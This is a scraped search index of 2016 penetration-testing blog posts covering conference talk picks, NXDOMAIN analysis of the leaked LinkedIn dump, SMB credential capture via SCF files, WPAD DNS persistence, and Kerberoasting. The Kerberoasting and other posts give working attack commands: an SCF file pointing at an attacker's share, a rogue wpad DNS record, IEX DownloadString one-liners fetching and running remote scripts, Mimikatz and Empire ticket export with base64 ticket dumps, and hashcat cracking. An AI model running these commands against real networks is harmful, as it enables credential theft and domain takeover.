tests yet, definitely interested on how to abuse access when/if I do. 🌟 Crippling HTTPS with Unholy PAC I use PAC files a lot, so I’m very curious how these can be manipulated further Captain Hook: Pirating AVs to bypass exploit mitigations Always interested in how to break AVs ;-) 5:30 - 6:00 Building a product security incident response team: Learning from the hivemind This is a question I thought a lot about, curious on new solutions Unleash the infection monkey: A modern alternative to pen-tests Curious how someone automated me ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:3:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 4 - Thursday 9:00 - 9:25 Badtunnel : How do I get big brother power? Morbid curiosity. Go read the abstract, you’ll understand. 9:45 - 10:35 🌟 The remote malicious butler did it! Rogue Domain Controllers and kerberos? I’m game. It’s from the Microsoft ATA guys, so might end like an advertisement. 11:00 - 11:50 🌟 Cunning with CNG: Soliciting secrets from Schannel Pulling keys out of Windows systems to decrypt TLS/SSL traffic? swweeeeet!! 12:10 - 1:00 AirBNBware: Short term rentals, long term pwnage I’ve used AirBnB and these thought did cross my mind when the person’s welcome sheet included their WPA password. BadWPAD DNS purchases to get WPAD requests, interested if they have anything new 2:30 - 3:20 Bad for enterprise: Attacking BYOD enterprise mobile security solutions Release of a tool called “Swizzler” to automate breaking “secure enclave” mobile apps? Swweeet! 3:50 - 4:40 🌟 The beast within: Evading Dynamic Malware Analysis using Microsft COM COM object fun? Don’t have to tell me twice DEF CON ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:4:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 4 - Thursday 12:00 Beyond the MCSE: Red Teaming Active Directory This talk is also at BlackHat, only reason I didn’t list it there was because it will probably be a packed room like it was last year. ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:5:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 5 - Friday 10:00 🌟 BSodomizer HD: A mischievous FPGA and HDMI platform for the (m)asses An FPGA based HDMI board that can rewrite displays as the old one did, but also intercept, and record screenshots. 11:00 Project CITL This is the Underwriters Lab for “Cyber” (but as the abstract says, without any type of certifications or seals of approval) 12:00 411: A framework for managing security alerts I know of a lot of firms that have switched to ELK, they gave this talk at “ElastiCON”, here are the slides where they listed a Github 411 project, but it doesn’t seem to be released yet. Hope they do so at Def Con 12:30 Frontrunning the frontrunners DNS NXDomain response registration of new domains? Who doesn’t love DNS? Cheap tools for hacking heavy trucks I have family members who are truck drivers so this directly impacts their safety. 2:00 🌟 Anti-Forensics AF int0x80 talking about anti-forensics techniques. 4:00 Robot hacks video games: How TASBot exploits consoles with custom controllers They used Nintento R.O.B. to hack consoles. We “Rob\"s have to stick together. 4:30 Mr. Robot Panel This room will be packed. I mainly want to go to ask a question: Do they think they are hurting the hacker community by sensationalizing “FSociety” as a positive influence in the Mr. Robot world? Feel free to comment below or hit me up on Facebook/Twitter one what you think. ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:6:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 6 - Saturday 10:00 🌟 Developing Managed Code Rootkits for Java Runtime Environment I love MCRs and a JRE MCR sounds awesome, especially with all the server-side Java that exists these days I fight for the users, Episode 1 - Attacks against top consumer products Got the inside scoop that there might be some additions/updates to ZackAttack (finally) coming in this talk. 11:00 Picking Bluetooth Low-Energy locks from a quarter mile away Sounds like a good talk about actually doing things with BLE locks and release of tools. w00tw00t! 12:00 Bypassing captive portals and limited networks Bypassing portals, I’m down, I just hope it’s not just DNS tunneling 13:00 🌟 Six Degrees of Domain Admin - Using “BloodHound” to automate Active Directory domain privilege escalation analysis If you missed the BSidesLV version, here it is again. Graph theory applied to derivative admin, what’s not to love? 🌟 Cunning with CNG: Soliciting secrets from Schannel This talk is also at BlackHat, so if I miss this I can see it here. Pulling keys out of Windows systems to decrypt TLS/SSL traffic? swweeeeet!! 14:00 Universal Serial aBUSe: Remote physical access attacks A new piece of USB hardware and software? Yes please. Plus, it’s Sensepost. 15:00 🌟 Phishing without failure and frustration Always interested in story time with Jay and Larry, but also no matter how many times you send a phishing campaign, there are always new ideas and methods to be learned. Not sure why it’s in the 101 track. 17:00 Sticky keys to the kingdom: Pre-auth RCE is more common than you think They didn’t mention sticky keys in their abstract but it’s in the title so I’m assuming the tool release has something to do with that. Awesome either way. ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:7:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"Aug 7 - Sunday 11:00 🌟 Use their machines against them: Loading code with a copier I’ve use copier and printers for a number of things, but hosting PowerSploit tools via Excel somehow seems really interesting 12:00 Let’s get physical: Network attacks against physical security systems Attacking physical security systems is still a dark art to me, definitely into learning more about how it’s done. 16:30 Closing Ceremonies ","date":"2016-07-24","objectID":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/:8:0","tags":["defcon","blackhat","conference"],"title":"BlackHat/Def Con/BSides Talk Picks for 2016","uri":"https://malicious.link/posts/2016/blackhat-defcon-bsides-talk-picks-2016/"},{"categories":null,"content":"I recently asked a friend if I could have just a list of the domains in the LinkedIn dump, no passwords, not full emails, just domains. I run a program that I lovingly call “DeepMagic” and I feed it domains whenever I can. Well, this time when I tossed the list of domains into the engine it started spitting out tons of errors. There was a total of 9,436,804 unique domains names in the list, and for anyone who works with DNS that isn’t a very big number, so I didn’t think very much of it and didn’t know why it would choke on a list that small. When I looked at the logs I noticed that there was a very large percentage of the domains that were coming up with NXDOMAIN. Most of the time this means that the domain isn’t registered, but can also mean that no name servers are registered for the domain (this usually happens when a corporation doesn’t want to maintain the domain but still wants to hold onto it for brand management). I let the resolution keep going and just parsed out all of the NXDOMAINs, but when I saw the list of NXDOMAINs go over 90,000 and I wasn’t even out of the ‘A’s yet, I took a different approach. I sorted the list by count to find the most used domains (using of course my favorite sort | uniq -c | sort -n that I think everyone who’s ever done text parsing on Linux knows). It lead to a few surprises, first, people still use AOL and earthlink? Second… well just look for yourself: 32952409 gmail.com 24071552 hotmail.com 20421035 yahoo.com 4283225 aol.com 1983431 comcast.net 1431727 yahoo.co.in 1337019 msn.com 1041953 sbcglobal.net 1039635 rediffmail.com 995709 yahoo.fr 916458 yahoo.co.uk 845570 live.com 841415 yahoo.com.br 750175 hotmail.co.uk 742597 verizon.net 575381 hotmail.fr 530308 ymail.com 529548 cox.net 510463 bellsouth.net 504339 libero.it 480006 att.net 429760 yahoo.es 407687 btinternet.com 396313 mail.ru 376970 googlemail.com 307292 earthlink.net 304012 mac.com 266076 yahoo.in 262010 yahoo.ca I’ve never heard of rediffmail, you? Anyways, I pushed the list in this order into a simple script: cat domains_count.txt | xargs -P 100 -n 2 sh -c './findnx2.sh $1 $2' argv0 | tee nxdomains.txt This is what is in findnx2.sh: #!/bin/bash lines=$(nslookup ${2} | grep NXDOMAIN | wc -l) if [ $lines -eq \"1\" ] then echo \"$2 is open with count $1\" fi And out popped a pretty interesting list (top 50): domain -\u003e number of email accounts registered under that domain (based on number of occurrences of the domain in the unfiltered list): XXXXXXXXXXX is open with count 7606 hotmail.con is open with count 4367 c2i.net is open with count 3966 yahoo.con is open with count 3487 gmail.con is open with count 3249 90wewhelp.ru is open with count 3218 csupomona.edu is open with count 2844 us.ing.com is open with count 2622 test.linkedin.com is open with count 2583 wowhackgold.com is open with count 2515 yahoo.om is open with count 2461 alltel.net is open with count 6565 w.cn is open with count 2451 uolsinectis.com.ar is open with count 2315 gmail.fr is open with count 2830 gmail.om is open with count 2122 hotmail.cm is open with count 2044 alltel.com is open with count 2046 hotmail.om is open with count 1901 memo.ikea.com is open with count 1809 chicagogsb.edu is open with count 1758 gawab.com is open with count 2141 mscd.edu is open with count 1740 mayalasr.com is open with count 1626 yavvaram.com is open with count 1424 twtelecom.com is open with count 1448 asbada5m.com is open with count 1371 eunet.yu is open with count 1272 camerabuy.info is open with count 1156 mywdo.com is open with count 1275 g.mail.com is open with count 1089 nortelnetworks.com is open with count 1815 infotechsw.com is open with count 1040 saugov.sa.gov.au is open with count 1033 hoyllmail.com is open with count 1028 mn.rr.com is open with count 1029 apollogrp.edu is open with count 980 gemail.com is open with count 1086 v4q.info is open with count 928 hoylmail.com is open with count 915 yahoo.coom is open with count 890 ifrance.com is open with count 917 jus","date":"2016-06-17","objectID":"https://malicious.link/posts/2016/linkedin-nxdomains/:0:0","tags":["linkedin","dns"],"title":"Linkedin NXDOMAINs - Purchased Pwnage","uri":"https://malicious.link/posts/2016/linkedin-nxdomains/"},{"categories":null,"content":"Recently saw a link to an SCF file. Didn’t know what those were so I went digging. Turns out they are a simple text based file that controls Windows Explorer. ;-) Here are the examples I found via the references: Open Explorer [Shell] Command = 2 IconFile = explorer.exe, 1 [Taskbar] Command = Explorer Open “Channels” page in IE: [Shell] Command=3 IconFile=shdocvw.dll,-118 [IE] Command=Channels This didn’t work for me at all, probably because Internet Explorer doesn’t have “Channels” anymore. Minimize all windows: [Shell] Command=2 IconFile=explorer.exe,3 [Taskbar] Command=ToggleDesktop My first attempt to utilize this file format for fun was of course to just set the IconFile to an SMB share: [Shell] Command=2 IconFile=\\\\192.168.1.101\\share\\test.ico [Taskbar] Command=ToggleDesktop and that worked as expected, every time the share was opened, whoever opened that folder it automatically attempted to authenticate to the share that I specified. Lots easier than writing an LNK file. My gut is telling me there is more to this file format than meets the eye, especially when there are malware writers using it as well. I haven’t been able to get my hands on one to see what they are doing inside the file, but I assume it’s not just to minimize all windows. There are some hints that you can invoke COM objects.. who knows… ","date":"2016-06-14","objectID":"https://malicious.link/posts/2016/smb-http-auth-capture-via-scf/:0:0","tags":["scf","windows","smb"],"title":"SMB/HTTP Auth Capture via SCF File","uri":"https://malicious.link/posts/2016/smb-http-auth-capture-via-scf/"},{"categories":null,"content":"References: https://git.reactos.org/?p=reactos.git;a=commitdiff;h=f655c2aca94bcbd04677c9a1c874740f1f9adbd7 http://www.blitzmax.com/Community/posts.php?topic=76323 https://web.archive.org/web/20090122115553/http://shellrevealed.com/forums/thread/7604.aspx http://www.programmershare.com/2403039/ ","date":"2016-06-14","objectID":"https://malicious.link/posts/2016/smb-http-auth-capture-via-scf/:1:0","tags":["scf","windows","smb"],"title":"SMB/HTTP Auth Capture via SCF File","uri":"https://malicious.link/posts/2016/smb-http-auth-capture-via-scf/"},{"categories":null,"content":"Mostly just writing this so I can keep notes. Today I came up with the idea to forcibly put the WPAD entry into a Windows Domain’s DNS. For those who don’t know what this would do there is an entire Wikipedia article on the subject: https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol I did this via PowerShell pretty easily on one of the domain controllers like so: PS C:\\\u003e Add-DnsServerResourceRecordA -Name wpad -ZoneName sittingduck.info -IPv4Address 107.170.50.74 Where 107.170.50.74 is the Digital Ocean box I stood up external to my test domain. I installed a basic web server and went to test my brilliant idea, but I wasn’t getting any requests for wpad.dat As they say “there are no more original ideas” it looks like the awesome people at Microsoft not only had this idea but fixed it way back in 2008. but.. they also made a way to disable it - Removing WPAD from DNS block list Running the DNS entry update will propagate throughout the domain so you only have to set that once, however the block list is per domain controller (or DNS server if they are separated, which is rare these days as it’s a required service in later Windows server versions). I went in search of a registry key to make the modification because it’s much easier to hit the RemoteRegistry service on all the DCs than it is to run that command. I quickly found this blog post - EnableGlobalQueryBlockLisst registry key. A quick batch script to loop through each DomainController in the domain and I started getting a bunch of requests. [22/May/2016:21:56:28 EDT] \"GET /wpad.dat HTTP/1.1\" 200 58 - -\u003e /wpad.dat Now, you may be asking, “How is setting their proxy server any kind of real persistence?”, I implore you to go check out projects like mitmproxy, mitmf and BDFProxy Pentesters have been recommending for years to put a WPAD entry into DNS to protect against LAN based attackers with Responder. Who knew it actually didn’t do anything because Microsoft was blocking those lookups anyways. So, if you have better solutions for WPAD on an Enterprise domain please leave a comment below. (Turning off the setting is a per-user per-system setting and doesn’t disable it for the SYSTEM or other local accounts, so it’s harder than just “flip on this registry setting via GPO”) Oh and I’ll just leave this here: Proxy servers and WinRM ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/wpad-persistence/:0:0","tags":["persistence","wpad","dns"],"title":"WPAD Persistence","uri":"https://malicious.link/posts/2016/wpad-persistence/"},{"categories":null,"content":"References Removing WPAD from DNS block list EnableGlobalQueryBlockLisst registry key Proxy servers and WinRM mitmproxy mitmf BDFProxy ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/wpad-persistence/:0:1","tags":["persistence","wpad","dns"],"title":"WPAD Persistence","uri":"https://malicious.link/posts/2016/wpad-persistence/"},{"categories":null,"content":"Previous works: There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I’ll will be sure to reference it. Attacker KB Link: (to be updated later) Common Findings DB Link: (to be updated later) Now we start cracking the tickets we have and hopefully one will break. The problem with this format is that it takes a LONG time to crack, not as slow as some, but certainly not as fast as NTLM or the like, so pick your targets carefully as the more tickets you try and crack at once the slower it’s going to go. ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:0:0","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"Cracking SPN tickets ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:1:0","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"John the Ripper Format added September 30th 2015: https://github.com/magnumripper/JohnTheRipper/commit/05e514646dfe5aa65ee48774571c0169f7e25a53 If you aren’t already using the magnumripper version of John The Ripper you should be, it’s the latest and great and usually has all of the updated formats, fixes, and speedups. In this case it’s also the only version that has the KRB5TGS format. root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi \u003e /tmp/johnkirb.txt root@wpad:~/johntheripper/run# ./john /tmp/johnkirb.txt --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 11 password hashes with 11 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Warning: OpenMP is disabled; a non-OpenMP build may be faster Press 'q' or Ctrl-C to abort, almost any other key for status 0g 0:00:00:07 3.35% (ETA: 23:38:44) 0g/s 69751p/s 767263c/s 767263C/s 129700..123junior ASDqwe123 ($krb5tgs$unkown) ASDqwe123 ($krb5tgs$unkown) w00t! Easy passwords. These are valid account passwords and you should be able to do with them whatever that account can do. We will explore the ability to use them as silver tickets later in this post but don’t loose sight that you have a completely valid new account that has access somewhere. ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:1:1","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"oclHashcat John The Ripper is fast, but we need that GPU speed for slow hashes like this. Again, we are on the cutting edge of hashes it seems so we are going to have to build the Github version of oclHashcat Support added to oclHashcat to crack Kerberos 5 TGS-REP: https://t.co/wsL2VUihNR (Our first algorithm contributed by community, yay!) — hashcat (@hashcat) February 17, 2016 Luckily, building it is pretty straight forward: https://github.com/hashcat/oclHashcat/blob/master/docs/BUILD.md Problem is that we have hashes in John the Ripper format and we have to get them into a format that oclHashcat understands: Example Hashes: https://hashcat.net/wiki/doku.php?id=example_hashes 13100 Kerberos 5 TGS-REP etype 23 - $krb5tgs$23$*user$realm$test/spn*$140964709dbdeccbc6121b675ccfb8b2$af937e9d5691b74600e514a3105976f1a8ddb2eed3aeb008ea74ff50bee7a65f14e8c1cbbc360687e6d867c9fbe2e4b2004d0584f0c283a18f613c69c756f78c001647e01da84466f59c655a25913b0cb4e42f0dc88f461e921441da40d6fb56d40545f71b841d00f019f135eb93c2357253796e5dc7da8a455d4fe17c966c3ea3ac620eb5e51c44c8a9cc48d385680c64c519e2113497315e7d7623044d48e2272bd9836b754755c3494040b487757a936780daeff859dd2c8839 If you got your tickets from kirbi2john.py you can convert them using cat kirbi2johnoutput.txt | sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' If you got them from Impacket, they are already in a format that is compatible with both John the Ripper and oclHashcat. Here is the speed results that Atom was getting using his AMD R9 GPU: http://pastebin.com/raw/3eHx2bFr root@sf:~/oclHashcat# ./oclHashcat -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l oclHashcat v2.01 (g0891e39) starting... Device #1: Hawaii, 2858/4025 MB allocatable, 1010Mhz, 44MCU Device #2: AMD FX(tm)-8120 Eight-Core Processor, skipped Hashes: 1 hashes; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Applicable Optimizers: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt * Brute-Force Watchdog: Temperature abort trigger set to 90c Watchdog: Temperature retain trigger set to 80c Device #1: Kernel /root/git/oclHashcat/kernels/m13100_a3.919aa8b9.kernel (234320 bytes) Device #1: Kernel /root/git/oclHashcat/kernels/markov_le.919aa8b9.kernel (36184 bytes) Device #1: autotuned kernel-accel to 64 Device #1: autotuned kernel-loops to 50 [s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit =\u003e $krb5tgs$23$*user$realm$test/hashcat*$08e2261b7a89e56f530b2f7e0620fe8b$ecdca97c13814c95810d7706faf986dad98d06ba033fc5a45fbe9b417b855db5:hashcat Session.Name...: oclHashcat Status.........: Cracked Input.Mode.....: Mask (?l?l?l?l?l?l?l) [7] Hash.Target....: $krb5tgs$23$*user$realm$test/hashcat*$08e... Hash.Type......: Kerberos 5 TGS-REP etype 23 Time.Started...: Wed Feb 17 08:33:57 2016 (5 secs) Speed.Dev.#1...: 111.0 MH/s (80.83ms) Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.......: 252313600/8031810176 (3.14%) Rejected.......: 0/252313600 (0.00%) Restore.Point..: 0/456976 (0.00%) HWMon.GPU.#1...: 0% Util, 42c Temp, 20% Fan Started: Wed Feb 17 08:33:57 2016 Stopped: Wed Feb 17 08:34:04 2016 Where I was only getting about half of that speed against one hash (NVidia GTX 970): Session.Name...: oclHashcat Status.........: Running Rules.Type.....: File (rules\\dive.rule) Input.Mode.....: File (..\\dictionarys\\rockyou.txt) Hash.Target....: (snip) Hash.Type......: Kerberos 5 TGS-REP etype 23 Time.Started...: Sun May 22 01:32:50 2016 (25 secs) Time.Estimated.: Sun May 22 09:04:48 2016 (7 hours, 31 mins) Speed.Dev.#1...: 57894.8 kH/s (14.37ms) Recovered......: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts And as you can see, going against 100 hashes pushed the wait time out to 30 days vs. 7 hours. Session.Name...: oclHashcat Status.........: Running Rules.Type.....: File (rules\\dive.rule) Input.Mode.....: File (..\\dictionarys\\rockyou.txt) Hash.Target....: (snip) Hash.Type......: Kerberos 5 TGS-REP etype 23 Time.Started...: Sun May 22 01:35:16 2016 (16 secs) Time","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:1:2","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"Tools Kerberoast Impacket PyKerberoast Github - John the Ripper - Magnumripper Github - oclHashcat ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:2:0","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"Presentations Tim Medin’s Slides - [Kicking the Guard Dog of Hades - slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) Tim Medin’s Video - Kicking the Guard Dog of Hades - video ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:3:0","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"Other write ups Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild Ben Lincoln’s writeup on Brute Forcing Service Account Passwords Leon Jacob’s writeup on Kerberoast Sean Metcalf’s writeup on Kerberoast Sean Metcalf’s SPN directory ","date":"2016-05-22","objectID":"https://malicious.link/posts/2016/kerberoast-pt3/:4:0","tags":["kerberos","jtr","oclhashcat"],"title":"Kerberoasting - Part 3","uri":"https://malicious.link/posts/2016/kerberoast-pt3/"},{"categories":null,"content":"Previous works: There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I’ll will be sure to reference it. Attacker KB Link: (to be updated later) Common Findings DB Link: (to be updated later) Now that we’ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them. ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:0:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Requesting SPN Kerberos Tickets ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:1:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"PowerShell Requesting These are stolen directly from Tim Medin @timmedin’s Kerberoast repository README.md One specific ticket: This is great if you are targeting one specific user account: PS C:\\\u003e Add-Type -AssemblyName System.IdentityModel PS C:\\\u003e New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/web01.medin.local\" All the tickets (including Computer account tickets): I’m not a huge fan of this method since you get too many tickets to deal with but it’s a great example of how to use PowerShell to parse and request things like this: PS C:\\\u003e Add-Type -AssemblyName System.IdentityModel PS C:\\\u003e setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:1:1","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"PowerShell Requesting - Just Users Getting just the User tickets: This is a slightly modified version of Tim’s script from above. It pulls down his GetUserSPNs powershell script instead of using SetSPN.exe and makes a request for each of the resulting SPN tickets. PS C:\\\u003e Add-Type -AssemblyName System.IdentityModel PS C:\\\u003e IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1\") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}} ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:1:2","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Empire PowerShell Empire received the functionality to get the SPN Tickets via @harmj0y’s commit here: b977dec which as of the writing of this post was still in the dev branch of Empire (not master yet) (Empire: BDW3E2G2ZRKCUS3B) \u003e usemodule credentials/get_spn_tickets (Empire: credentials/get_spn_tickets) \u003e info Name: Get-SPNTickets Module: credentials/get_spn_tickets NeedsAdmin: False OpsecSafe: True MinPSVersion: 2 Background: True OutputExtension: None Authors: @harmj0y Description: Requests kerberos tickets for all users with a non-null service principal name (SPN). These tickets can be extracted with credentials/mimikatz/extract_tickets. Options: Name Required Value Description ---- -------- ------- ----------- Agent True BDW3E2G2ZRKCUS3B Agent to run module on. (Empire: credentials/get_spn_tickets) \u003e run Job started: Debug32_a7og3 Id : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-1 SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe y} ValidFrom : 5/19/2016 3:06:41 PM ValidTo : 5/19/2016 3:08:41 PM ServicePrincipalName : kadmin/changepw SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey Id : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-2 SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe y} ValidFrom : 5/19/2016 3:06:41 PM ValidTo : 5/20/2016 12:53:24 AM ServicePrincipalName : http/win10.sittingduck.info SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey Id : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-3 SecurityKeys : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe y} ValidFrom : 5/19/2016 3:06:41 PM ValidTo : 5/20/2016 12:53:24 AM ServicePrincipalName : MSSQLSvc/WIN2K8R2.sittingduck.info SecurityKey : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey Get-SPNTickets completed! ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:1:3","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Exporting the tickets Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire: ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:2:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Mimikatz Using the kerberos::list /export functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome @gentilkiwi saves us and has included a “base64” mode for Mimikatz So here I’m simply pulling the Invoke-Mimikatz script that @JosephBialek “clymb3r” created, into memory, telling Mimikatz to go in “base64” mode, export all of the active tickets and exit. PS C:\\\u003e IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\") PS C:\\\u003e Invoke-Mimikatz -Command 'standard::base64 \"kerberos::list /export\" exit' ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:2:1","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Empire Here is the module: (Empire: agents) \u003e usemodule credentials/mimikatz/extract_tickets (Empire: credentials/mimikatz/extract_tickets) \u003e info Name: Invoke-Mimikatz extract kerberos tickets. Module: credentials/mimikatz/extract_tickets NeedsAdmin: False OpsecSafe: True MinPSVersion: 2 Background: True OutputExtension: None Authors: @JosephBialek @gentilkiwi Description: Runs PowerSploit's Invoke-Mimikatz function to extract kerberos tickets from memory in base64-encoded form. Options: Name Required Value Description ---- -------- ------- ----------- Agent True None Agent to run module on. And the result… Job started: Debug32_segox Hostname: win7.sittingduck.info / S-1-5-21-4217918325-2978756054-1117708521 .#####. mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 18 modules * * */ mimikatz(powershell) # standard::base64 isBase64Intercept was : false isBase64Intercept is now : true mimikatz(powershell) # kerberos::list /export [00000000] - 0x00000012 - aes256_hmac Start/End/MaxRenew: 5/19/2016 10:53:27 AM ; 5/19/2016 8:53:24 PM ; 5/26/2016 10:53:24 AM Server Name : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO Client Name : notanadmin @ SITTINGDUCK.INFO Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; ==================== Base64 of file : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi ==================== doIFTjCCBUqgAwIBBaEDAgEWooIEVTCCBFFhggRNMIIESaADAgEFoRIbEFNJVFRJ TkdEVUNLLklORk+iJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFNJVFRJTkdEVUNLLklO Rk+jggQFMIIEAaADAgESoQMCAQKiggPzBIID755axXlzQ6q8s93GffDw/YjUwy+U KYB3hUdJijD2VtVPfHGnADl/pT2+Xuhu4uMOiVhsjUR/bfhIn8G1MkHPh3d3EtWx 